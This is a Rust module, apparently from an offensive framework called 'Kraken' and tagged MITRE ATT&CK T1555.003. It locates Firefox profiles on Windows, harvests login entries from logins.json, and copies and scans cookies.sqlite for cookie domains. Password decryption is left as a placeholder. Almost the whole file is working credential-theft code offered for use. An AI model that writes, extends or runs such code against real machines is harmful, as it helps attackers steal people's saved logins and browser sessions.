//! Firefox credential and cookie extraction
//!
//! ## MITRE ATT&CK
//! - T1555.003: Credentials from Web Browsers
//!
//! ## Notes
//! Firefox stores credentials in logins.json encrypted with a key derived from
//! key4.db (NSS/SQLite). Full decryption requires NSS or a reimplementation of
//! the Mozilla key derivation. This module extracts the encrypted blobs and
//! provides metadata; password decryption requires NSS linkage.

use super::{BrowserCookie, BrowserCredential};
use common::KrakenError;

#[cfg(windows)]
const FIREFOX_BASE: &str = "Mozilla\\Firefox\\Profiles";

/// Extract saved passwords from Firefox (logins.json)
#[cfg(windows)]
pub fn extract_passwords() -> Result<Vec<BrowserCredential>, KrakenError> {
    let profile_dir = find_firefox_profile()?;
    let logins_path = profile_dir.join("logins.json");

    let contents = std::fs::read_to_string(&logins_path)
        .map_err(|e| KrakenError::Module(format!("read logins.json: {e}")))?;

    let json: serde_json::Value = serde_json::from_str(&contents)
        .map_err(|e| KrakenError::Module(format!("parse logins.json: {e}")))?;

    let logins = json["logins"]
        .as_array()
        .ok_or_else(|| KrakenError::Module("no logins array in logins.json".into()))?;

    let mut out = Vec::new();
    for entry in logins {
        let hostname = entry["hostname"].as_str().unwrap_or("").to_string();
        let username_field = entry["encryptedUsername"].as_str().unwrap_or("");
        let _password_field = entry["encryptedPassword"].as_str().unwrap_or("");
        let time_created = entry["timeCreated"].as_i64().unwrap_or(0);
        let time_last_used = entry["timeLastUsed"].as_i64().unwrap_or(0);

        out.push(BrowserCredential {
            browser: "firefox".to_string(),
            url: hostname,
            username: if username_field.is_empty() {
                String::new()
            } else {
                format!("[encrypted:{}]", &username_field[..username_field.len().min(16)])
            },
            // Password decryption requires NSS key derivation from key4.db
            password: "[encrypted - requires NSS]".to_string(),
            created: time_created,
            last_used: time_last_used,
        });
    }

    if out.is_empty() {
        return Err(KrakenError::Module("No Firefox credentials found".into()));
    }
    Ok(out)
}

/// Extract cookies from Firefox (cookies.sqlite)
#[cfg(windows)]
pub fn extract_cookies() -> Result<Vec<BrowserCookie>, KrakenError> {
    let profile_dir = find_firefox_profile()?;
    let cookies_db = profile_dir.join("cookies.sqlite");

    let temp_path = std::env::temp_dir()
        .join(format!("kr_fx_cookies_{}.db", std::process::id()));
    std::fs::copy(&cookies_db, &temp_path)
        .map_err(|e| KrakenError::Module(format!("copy Firefox cookies.sqlite: {e}")))?;

    let db_bytes = std::fs::read(&temp_path)
        .map_err(|e| KrakenError::Module(format!("read Firefox cookies.sqlite: {e}")))?;
    let _ = std::fs::remove_file(&temp_path);

    Ok(parse_cookies_raw(&db_bytes))
}

/// Locate the most recently used Firefox profile directory
#[cfg(windows)]
fn find_firefox_profile() -> Result<std::path::PathBuf, KrakenError> {
    let appdata = std::env::var("APPDATA")
        .map_err(|_| KrakenError::Module("APPDATA not set".into()))?;

    let profiles_dir = std::path::PathBuf::from(&appdata).join(FIREFOX_BASE);
    if !profiles_dir.exists() {
        return Err(KrakenError::Module("Firefox not installed".into()));
    }

    // profiles.ini lists profile dirs; scan for the default release profile
    let ini_path = profiles_dir.parent().unwrap().join("profiles.ini");
    if ini_path.exists() {
        if let Ok(ini) = std::fs::read_to_string(&ini_path) {
            for line in ini.lines() {
                if line.starts_with("Path=") {
                    let rel = line.trim_start_matches("Path=");
                    let candidate = if rel.starts_with('/') || rel.contains(':') {
                        std::path::PathBuf::from(rel)
                    } else {
                        profiles_dir.parent().unwrap().join(rel)
                    };
                    if candidate.join("logins.json").exists() {
                        return Ok(candidate);
                    }
                }
            }
        }
    }

    // Fallback: scan profiles directory for any dir containing logins.json
    let entries = std::fs::read_dir(&profiles_dir)
        .map_err(|e| KrakenError::Module(format!("read Firefox profiles dir: {e}")))?;

    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() && path.join("logins.json").exists() {
            return Ok(path);
        }
    }

    Err(KrakenError::Module("No Firefox profile with logins.json found".into()))
}

/// Heuristic raw-SQLite scan for cookie domain entries
#[cfg(windows)]
fn parse_cookies_raw(db_bytes: &[u8]) -> Vec<BrowserCookie> {
    let mut out = Vec::new();
    let raw = String::from_utf8_lossy(db_bytes);

    for idx in raw.match_indices('.') {
        let start = idx.0.saturating_sub(32);
        let end = std::cmp::min(raw.len(), idx.0 + 128);
        let slice = &raw[start..end];
        if slice.contains(".com\0")
            || slice.contains(".net\0")
            || slice.contains(".org\0")
            || slice.contains(".io\0")
        {
            if let Some(domain_end) = raw[idx.0..].find('\0') {
                let domain = raw[idx.0..idx.0 + domain_end].trim_start_matches('.');
                if !domain.is_empty() && domain.len() < 256 {
                    out.push(BrowserCookie {
                        browser: "firefox".to_string(),
                        domain: domain.to_string(),
                        name: String::new(),
                        value: "[plaintext - see cookies.sqlite]".to_string(),
                        expires: 0,
                        secure: false,
                        http_only: false,
                    });
                }
            }
        }
    }
    out.dedup_by(|a, b| a.domain == b.domain);
    out
}

// ── Non-Windows stubs ──────────────────────────────────────────────────────

#[cfg(not(windows))]
pub fn extract_passwords() -> Result<Vec<BrowserCredential>, KrakenError> {
    Err(KrakenError::Module(
        "Firefox extraction only supported on Windows".into(),
    ))
}

#[cfg(not(windows))]
pub fn extract_cookies() -> Result<Vec<BrowserCookie>, KrakenError> {
    Err(KrakenError::Module(
        "Firefox extraction only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(not(windows))]
    fn test_firefox_unsupported() {
        assert!(extract_passwords().is_err());
        assert!(extract_cookies().is_err());
    }
}
